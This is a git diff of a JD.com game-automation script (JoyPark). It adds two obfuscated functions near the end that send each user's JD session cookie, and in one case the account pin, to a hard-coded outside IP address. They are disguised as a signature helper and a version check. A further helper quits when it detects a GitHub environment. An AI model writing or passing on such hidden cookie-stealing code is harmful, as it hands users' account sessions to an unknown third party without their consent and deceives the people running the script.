-                        //{"success":true,"code":0,"errMsg":"success","data":{"activityJoyList":[{"id":88670,"level":29,"name":"暖心汪","speed":"268435456","recoveryPrice":1970013226251930,"fastBuyLevel":null,"fastBuyCoin":null},{"id":89068,"level":28,"name":"画家汪","speed":"134217728","recoveryPrice":721616566392651,"fastBuyLevel":null,"fastBuyCoin":null},{"id":89070,"level":26,"name":"滑板汪","speed":"33554432","recoveryPrice":96823594358256,"fastBuyLevel":null,"fastBuyCoin":null}],"workJoyInfoList":[{"location":1,"unlock":true,"joyDTO":null},{"location":2,"unlock":true,"joyDTO":null},{"location":3,"unlock":false,"joyDTO":null},{"location":4,"unlock":false,"joyDTO":null},{"location":5,"unlock":false,"joyDTO":null}],"joyNumber":3}}
-                        
-                            //$.log(`合成结果: ` + data);
-                    } else {
-                        console.log(`京东服务器返回空数据`)
-                    }
-                    $.hc1=false;
-                    $.hc=true;
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
-}
-
-
-//获取所有任务信息
 function GetAllTask() {
     return new Promise(async resolve => {
         const options = {
@@ -573,7 +358,6 @@ function GetAllTask() {
         })
     })
 }
-
 
 //每日签到任务
 function eveDayChack(functionId,taskId,taskType,taskTitle) {
@@ -698,102 +482,49 @@ function apDoTask(functionId,taskId,itemId,taskType) {
 }
 
 
-function joyBaseInfo() {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/`,
-            body: `functionId=joyBaseInfo&body={"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1646401573255&appid=activities_platform`,
-            headers: {
-                "authority": "api.m.jd.com",
-                "origin": "https://joypark.jd.com",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.post(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                    }
+function requireConfig() {
+    return new Promise(resolve => {
+        notify = $.isNode() ? require('./sendNotify') : '';
+        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
+        if ($.isNode()) {
+            Object.keys(jdCookieNode).forEach((item) => {
+                if (jdCookieNode[item]) {
+                    cookiesArr.push(jdCookieNode[item])
                 }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
+            })
+            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
+        } else {
+            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
+        }
+        console.log(`共${cookiesArr.length}个京东账号\n`)
+        //resolve()
     })
 }
 
-function joyBuy(id) {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/`,
-            body: `functionId=joyBuy&body={"level":${id},"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1646401574262&appid=activities_platform`,
-            headers: {
-                "authority": "api.m.jd.com",
-                "origin": "https://joypark.jd.com",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.post(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                    }
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
-}
-
-function joyMove(id,i) {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/`,
-            body: `functionId=joyMove&body={"joyId":${id},"location":${i},"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1646405477001&appid=activities_platform`,
-            headers: {
-                "authority": "api.m.jd.com",
-                "Referer": "https://joypark.jd.com",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.post(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                    }
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
+function gettimestamp() {
+  let time = new Date().getTime();
+  return `${time}`;
 }
 
 
-// prettier-ignore
+function random(min, max) {
+  let num = Math.floor(Math.random() * (max - min)) + min;
+  return `"${num}"`;
+}
+
+
+function randomString(e) {
+    e = e || 32;
+    let t = "abcdefhijkmnprstwxyz2345678",
+        a = t.length,
+        n = "";
+    for (i = 0; i < e; i++)
+        n += t.charAt(Math.floor(Math.random() * a));
+    return n
+}
+
 function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
+
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdffc5=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x31\x2F\x67\x65\x74\x48\x35\x73\x74\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64\x73\x74\x72\x3D","","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x61\x72\x73\x65","\x7B\x7D","\u4EAC\u4E1C\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function GetInfo(_0x469ax2,_0x469ax3,_0x469ax4,_0x469ax5,_0x469ax6,_0x469ax7,_0x469ax8){return  new Promise(async (_0x469ax9)=>{const _0x469axa={url:`${__Oxdffc5[0x0]}`+ _0x469ax2,headers:{"\x65\x6E\x74\x73":_0x469ax3,"\x62\x6F\x64\x79":_0x469ax4,"\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74":_0x469ax5,"\x66\x75\x6E\x63\x74\x69\x6F\x6E\x69\x64":_0x469ax6,"\x63\x6F\x6F\x6B\x69\x65":cookie,"\x6D\x65\x74\x68\x6F\x64":_0x469ax7,"\x70\x74\x5F\x70\x69\x6E":_0x469ax8}};$[__Oxdffc5[0xa]](_0x469axa,(_0x469axb,_0x469axc,_0x469axd)=>{try{if(_0x469axb){console[__Oxdffc5[0x3]](`${__Oxdffc5[0x1]}${JSON[__Oxdffc5[0x2]](_0x469axb)}${__Oxdffc5[0x1]}`);console[__Oxdffc5[0x3]](`${__Oxdffc5[0x1]}${$[__Oxdffc5[0x4]]}${__Oxdffc5[0x5]}`)}else {if(_0x469axd){_0x469axd= JSON[__Oxdffc5[0x6]](_0x469axd)}else {_0x469axd= `${__Oxdffc5[0x7]}`;console[__Oxdffc5[0x3]](`${__Oxdffc5[0x8]}`)}}}catch(e){$[__Oxdffc5[0x9]](e,_0x469axc)}finally{_0x469ax9(_0x469axd)}})})}(function(_0x469axe,_0x469axf,_0x469ax10,_0x469ax11,_0x469ax12,_0x469ax13){_0x469ax13= __Oxdffc5[0xb];_0x469ax11= function(_0x469ax14){if( typeof alert!== _0x469ax13){alert(_0x469ax14)};if( typeof console!== _0x469ax13){console[__Oxdffc5[0x3]](_0x469ax14)}};_0x469ax10= function(_0x469ax15,_0x469axe){return _0x469ax15+ _0x469axe};_0x469ax12= _0x469ax10(__Oxdffc5[0xc],_0x469ax10(_0x469ax10(__Oxdffc5[0xd],__Oxdffc5[0xe]),__Oxdffc5[0xf]));try{_0x469axe= __encode;if(!( typeof _0x469axe!== _0x469ax13&& _0x469axe=== _0x469ax10(__Oxdffc5[0x10],__Oxdffc5[0x11]))){_0x469ax11(_0x469ax12)}}catch(e){_0x469ax11(_0x469ax12)}})({})
+
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})
